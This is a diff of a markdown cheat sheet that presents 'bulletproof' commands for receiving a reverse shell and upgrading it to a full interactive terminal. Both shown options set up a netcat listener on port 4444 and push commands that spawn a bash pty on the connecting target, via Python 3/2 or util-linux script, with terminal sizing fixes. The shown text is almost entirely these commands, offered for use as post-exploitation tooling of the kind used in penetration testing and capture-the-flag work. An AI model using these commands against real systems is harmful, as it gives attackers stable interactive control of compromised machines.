@@ -11,15 +11,17 @@ Unlike a standard reverse shell, these commands enable:
 ------------------------------
 ## 🛠️ "Bulletproof" Commands (Enhanced)
 These versions include logic to detect available binaries on the target system to prevent silent failures.
-## Option A: The Standard (Python 3/2)
-The most reliable method if a Python interpreter is present. It attempts Python 3 first, then falls back to Python 2.
 
+**Option A: Python Standard**
+```bash
 stty raw -echo; (echo "stty cols $(tput cols) rows $(tput lines) 2>/dev/null; export TERM=xterm-256color; python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || python -c 'import pty; pty.spawn(\"/bin/bash\")' || /bin/bash"; cat) | nc -lvnp 4444; stty sane
+```
 
-## Option B: The Universal (util-linux script)
-The best alternative if Python is missing. Works on almost any modern Linux distribution.
-
+**Option B: Universal Script**
+```bash
 stty raw -echo; (echo "stty cols $(tput cols) rows $(tput lines) 2>/dev/null; export TERM=xterm-256color; /usr/bin/script -qc /bin/bash /dev/null"; cat) | nc -lvnp 4444; stty sane
+```
+
 
 ------------------------------
 ## 🔍 Technical Breakdown (Deep Dive)## 1. Local Pre-processing (stty raw -echo)
